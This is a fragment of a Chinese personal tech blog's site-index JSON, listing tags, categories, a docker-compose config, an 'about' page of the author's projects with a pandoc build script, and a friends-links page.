}}","link":"/2022/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Script/PowerShell%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"C++","slug":"C","link":"/tags/C/"},{"name":"STL","slug":"STL","link":"/tags/STL/"},{"name":"Flutter","slug":"Flutter","link":"/tags/Flutter/"},{"name":"SSH","slug":"SSH","link":"/tags/SSH/"},{"name":"工具","slug":"工具","link":"/tags/%E5%B7%A5%E5%85%B7/"},{"name":"学习","slug":"学习","link":"/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"笔记","slug":"笔记","link":"/tags/%E7%AC%94%E8%AE%B0/"},{"name":"分布式计算","slug":"分布式计算","link":"/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E8%AE%A1%E7%AE%97/"},{"name":"Benchmark","slug":"Benchmark","link":"/tags/Benchmark/"},{"name":"工程化实践","slug":"工程化实践","link":"/tags/%E5%B7%A5%E7%A8%8B%E5%8C%96%E5%AE%9E%E8%B7%B5/"},{"name":"Crypto","slug":"Crypto","link":"/tags/Crypto/"},{"name":"Markdown","slug":"Markdown","link":"/tags/Markdown/"},{"name":"资料","slug":"资料","link":"/tags/%E8%B5%84%E6%96%99/"},{"name":"Pwn","slug":"Pwn","link":"/tags/Pwn/"},{"name":"HTML","slug":"HTML","link":"/tags/HTML/"},{"name":"CSS","slug":"CSS","link":"/tags/CSS/"},{"name":"table","slug":"table","link":"/tags/table/"},{"name":"HTTP","slug":"HTTP","link":"/tags/HTTP/"},{"name":"前端","slug":"前端","link":"/tags/%E5%89%8D%E7%AB%AF/"},{"name":"Blob","slug":"Blob","link":"/tags/Blob/"},{"name":"Bash","slug":"Bash","link":"/tags/Bash/"},{"name":"Wayland","slug":"Wayland","link":"/tags/Wayland/"},{"name":"C","slug":"C","link":"/tags/C/"},{"name":"Golang","slug":"Golang","link":"/tags/Golang/"},{"name":"Vue","slug":"Vue","link":"/tags/Vue/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"Kotlin","slug":"Kotlin","link":"/tags/Kotlin/"},{"name":"TypeScript","slug":"TypeScript","link":"/tags/TypeScript/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"Dart","slug":"Dart","link":"/tags/Dart/"},{"name":"Lua","slug":"Lua","link":"/tags/Lua/"},{"name":"Shell","slug":"Shell","link":"/tags/Shell/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"计算机","slug":"计算机","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"数学","slug":"数学","link":"/tags/%E6%95%B0%E5%AD%A6/"},{"name":"算法","slug":"算法","link":"/tags/%E7%AE%97%E6%B3%95/"},{"name":"概率论","slug":"概率论","link":"/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"文学","slug":"文学","link":"/tags/%E6%96%87%E5%AD%A6/"},{"name":"科幻","slug":"科幻","link":"/tags/%E7%A7%91%E5%B9%BB/"},{"name":"随笔","slug":"随笔","link":"/tags/%E9%9A%8F%E7%AC%94/"},{"name":"hello-world","slug":"hello-world","link":"/tags/hello-world/"},{"name":"编程","slug":"编程","link":"/tags/%E7%BC%96%E7%A8%8B/"},{"name":"音乐","slug":"音乐","link":"/tags/%E9%9F%B3%E4%B9%90/"},{"name":"东方project","slug":"东方project","link":"/tags/%E4%B8%9C%E6%96%B9project/"},{"name":"游戏","slug":"游戏","link":"/tags/%E6%B8%B8%E6%88%8F/"},{"name":"Minecraft","slug":"Minecraft","link":"/tags/Minecraft/"},{"name":"Docker","slug":"Docker","link":"/tags/Docker/"},{"name":"STG","slug":"STG","link":"/tags/STG/"},{"name":"魔改","slug":"魔改","link":"/tags/%E9%AD%94%E6%94%B9/"},{"name":"符卡","slug":"符卡","link":"/tags/%E7%AC%A6%E5%8D%A1/"},{"name":"逆向工程","slug":"逆向工程","link":"/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"单片机","slug":"单片机","link":"/tags/%E5%8D%95%E7%89%87%E6%9C%BA/"},{"name":"模电","slug":"模电","link":"/tags/%E6%A8%A1%E7%94%B5/"},{"name":"C语言","slug":"C语言","link":"/tags/C%E8%AF%AD%E8%A8%80/"},{"name":"编译器","slug":"编译器","link":"/tags/%E7%BC%96%E8%AF%91%E5%99%A8/"},{"name":"Git","slug":"Git","link":"/tags/Git/"},{"name":"Android","slug":"Android","link":"/tags/Android/"},{"name":"IDE","slug":"IDE","link":"/tags/IDE/"},{"name":"文本编辑器","slug":"文本编辑器","link":"/tags/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8/"},{"name":"编辑器","slug":"编辑器","link":"/tags/%E7%BC%96%E8%BE%91%E5%99%A8/"},{"name":"栈","slug":"栈","link":"/tags/%E6%A0%88/"},{"name":"存储","slug":"存储","link":"/tags/%E5%AD%98%E5%82%A8/"},{"name":"备份","slug":"备份","link":"/tags/%E5%A4%87%E4%BB%BD/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"OCaml","slug":"OCaml","link":"/tags/OCaml/"},{"name":"数据安全","slug":"数据安全","link":"/tags/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/"},{"name":"VPN","slug":"VPN","link":"/tags/VPN/"},{"name":"计算机网络","slug":"计算机网络","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"计算机视觉","slug":"计算机视觉","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/"},{"name":"WSA","slug":"WSA","link":"/tags/WSA/"},{"name":"ADB","slug":"ADB","link":"/tags/ADB/"},{"name":"存储清理","slug":"存储清理","link":"/tags/%E5%AD%98%E5%82%A8%E6%B8%85%E7%90%86/"},{"name":"操作系统","slug":"操作系统","link":"/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"刷机","slug":"刷机","link":"/tags/%E5%88%B7%E6%9C%BA/"},{"name":"网络安全","slug":"网络安全","link":"/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Apache","slug":"Apache","link":"/tags/Apache/"},{"name":"汇编语言","slug":"汇编语言","link":"/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"并行计算","slug":"并行计算","link":"/tags/%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97/"},{"name":"消息传递","slug":"消息传递","link":"/tags/%E6%B6%88%E6%81%AF%E4%BC%A0%E9%80%92/"},{"name":"分布式内存","slug":"分布式内存","link":"/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E5%86%85%E5%AD%98/"},{"name":"多进程","slug":"多进程","link":"/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"},{"name":"指针","slug":"指针","link":"/tags/%E6%8C%87%E9%92%88/"},{"name":"开发","slug":"开发","link":"/tags/%E5%BC%80%E5%8F%91/"},{"name":"Web","slug":"Web","link":"/tags/Web/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"ElementPlus","slug":"ElementPlus","link":"/tags/ElementPlus/"},{"name":"Vite","slug":"Vite","link":"/tags/Vite/"},{"name":"node.js","slug":"node-js","link":"/tags/node-js/"},{"name":"数据统计","slug":"数据统计","link":"/tags/%E6%95%B0%E6%8D%AE%E7%BB%9F%E8%AE%A1/"},{"name":"技巧","slug":"技巧","link":"/tags/%E6%8A%80%E5%B7%A7/"},{"name":"PowerShell","slug":"PowerShell","link":"/tags/PowerShell/"}],"categories":[{"name":"物理","slug":"物理","link":"/categories/%E7%89%A9%E7%90%86/"},{"name":"计算机科学","slug":"计算机科学","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"},{"name":"数学","slug":"数学","link":"/categories/%E6%95%B0%E5%AD%A6/"},{"name":"高中数学","slug":"数学/高中数学","link":"/categories/%E6%95%B0%E5%AD%A6/%E9%AB%98%E4%B8%AD%E6%95%B0%E5%AD%A6/"},{"name":"概率论与数理统计","slug":"数学/概率论与数理统计","link":"/categories/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/"},{"name":"文学","slug":"文学","link":"/categories/%E6%96%87%E5%AD%A6/"},{"name":"杂谈","slug":"文学/杂谈","link":"/categories/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/"},{"name":"书斋","slug":"文学/书斋","link":"/categories/%E6%96%87%E5%AD%A6/%E4%B9%A6%E6%96%8B/"},{"name":"游记","slug":"文学/游记","link":"/categories/%E6%96%87%E5%AD%A6/%E6%B8%B8%E8%AE%B0/"},{"name":"游戏","slug":"游戏","link":"/categories/%E6%B8%B8%E6%88%8F/"},{"name":"信号与系统","slug":"物理/信号与系统","link":"/categories/%E7%89%A9%E7%90%86/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F/"},{"name":"微电子技术","slug":"物理/微电子技术","link":"/categories/%E7%89%A9%E7%90%86/%E5%BE%AE%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/"},{"name":"Minecraft","slug":"游戏/Minecraft","link":"/categories/%E6%B8%B8%E6%88%8F/Minecraft/"},{"name":"数据结构","slug":"计算机科学/数据结构","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"程序设计","slug":"计算机科学/程序设计","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"},{"name":"计算机组成原理","slug":"计算机科学/计算机组成原理","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"},{"name":"东方Project","slug":"游戏/东方Project","link":"/categories/%E6%B8%B8%E6%88%8F/%E4%B8%9C%E6%96%B9Project/"},{"name":"操作系统","slug":"计算机科学/操作系统","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"编程语言","slug":"计算机科学/编程语言","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"电路分析基础","slug":"物理/微电子技术/电路分析基础","link":"/categories/%E7%89%A9%E7%90%86/%E5%BE%AE%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"},{"name":"Android","slug":"计算机科学/操作系统/Android","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Android/"},{"name":"Linux","slug":"计算机科学/操作系统/Linux","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/"},{"name":"Windows","slug":"计算机科学/操作系统/Windows","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/"},{"name":"Assembly","slug":"计算机科学/编程语言/Assembly","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Assembly/"},{"name":"C·C++","slug":"计算机科学/编程语言/C·C","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C/"},{"name":"Golang","slug":"计算机科学/编程语言/Golang","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Golang/"},{"name":"Java","slug":"计算机科学/编程语言/Java","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/"},{"name":"JavaScript","slug":"计算机科学/编程语言/JavaScript","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/JavaScript/"},{"name":"PHP","slug":"计算机科学/编程语言/PHP","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/"},{"name":"Python","slug":"计算机科学/编程语言/Python","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/"},{"name":"Script","slug":"计算机科学/编程语言/Script","link":"/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Script/"}],"pages":[{"title":"","text":"{\"version\":\"3\",\"services\":{\"blog\":{\"image\":\"nginx:latest\",\"restart\":\"always\",\"volumes\":[\"./dist:/usr/share/nginx/html:ro\"],\"ports\":[\"2021:80\"]}}}","link":"/docker-compose.json"},{"title":"生即创造","text":"PROF1LE 兴趣/习惯是写代码。闲了喜欢整点小玩意玩=w=。 游戏玩的不多，一直断断续续在玩的只有mc还有车万壬和轻度引诱壬成分。 Homepage (zh) (in maintaince) | Blog | Blog (Pure) 咱的项目 Gin+Vue构建的RSS博客聚合站 使用Go+Vue+Docker实现的分布式OJ系统 数据库大作业，公交调度管理系统 Flutter练手作，复刻AutoSync。另外还有个用Flutter填坑的MCSM Panel，但是这东西用的不多也就没咋积极更新了 Flutter+Go+嵌入式搓的一套可垂直/水平扩缩容的物联网自动化系统，同时定义了一个用于设备控制的声明式DSL，目前唯一的应用场景就是点灯+温湿度监测。 用于通用二进制操作的工具库和专用语言，目标是支持任意格式二进制文件的声明式描述，以及自动化的序列化/反序列化，以及借助DSL支持的二进制编辑引擎。 目前刚搭完框架，其他的慢慢设计。 借助OCaml编写的简单的SQL解释器，以及一个简单的数据库后端实现。非常喜欢这个语言的类型系统，Type Deduction+纯纯函数式爽飞了好吧 另外这个博客的发布也借助GitHub Action实现了自动化编译发布，详见这里和我的workflow配置文件。 极速纯文字版的博客借助bash和pandoc实现： 12345678910gen: rm -rf dist &amp;&amp; mkdir -p dist &amp;&amp; cp -r img dist find ./_posts -type f -name &quot;*.md&quot; -exec sh -c 'pandoc &quot;$$1&quot; -s -o &quot;./dist/$$(basename &quot;$$1&quot; .md).html&quot; --mathjax' _ {} \\; pandoc -s -f markdown -t html --mathjax --metadata title=&quot;xero's blog&quot; -o ./dist/index.html \\ &lt;(echo -e &quot;&gt;enj0y creating\\n\\n&quot;) \\ ./links/index.md \\ &lt;(echo -e &quot;## toc\\n&quot;) \\ &lt;(find ./_posts -type f -name '*.md' -printf '- [%f](%f.html)\\n' | sed -e &quot;s/\\.md//g&quot;) \\ ./about/index.md \\ &lt;(echo -e &quot;2024 | xero's blog | powered by pandoc&quot;)","link":"/about/index.html"},{"title":"友情链接","text":"小伙伴们 Robotxm：电表开发者，原生启动！ SuperBart：能查水表得感谢这位 Holynia：哎你们二次元 Albert：TIS的鸽鸽 Ray：总有一天会办个计算机文物展子吧（ ComeIntoCalm：真·ACM大神 Dimole：Hacked By Dimole（逃 康师傅：(╹ڡ╹ ) 孤筝の温暖小窝：Ciallo～(∠・ω&lt; )⌒☆ bszydxh：b师傅怎么啥都会啊（膜 Reverier’s Blog：rx师傅教我开发吧（做梦 Canxin Site：哎你们Ruast批 小北的书夹：just so so 王兰花椒粉：名字好怪.jpg 闪电豹猫的自留地：JK触发器：亻尔女子 BLOG：sf什么时候换个标题 Aweip：且愿饮冰而热血不凉 康师傅：ksf什么时候V我BYD ForestLee：感谢学长送的极品圣遗物（ 木生懒得写博客：立 flag 小能手 Hanwan Space：We are here to put a dent in the universe. 想要交换友链的朋友们可以在下方留言 咱看到了会加上的&lt;(=w=)&gt;","link":"/links/index.html"}]}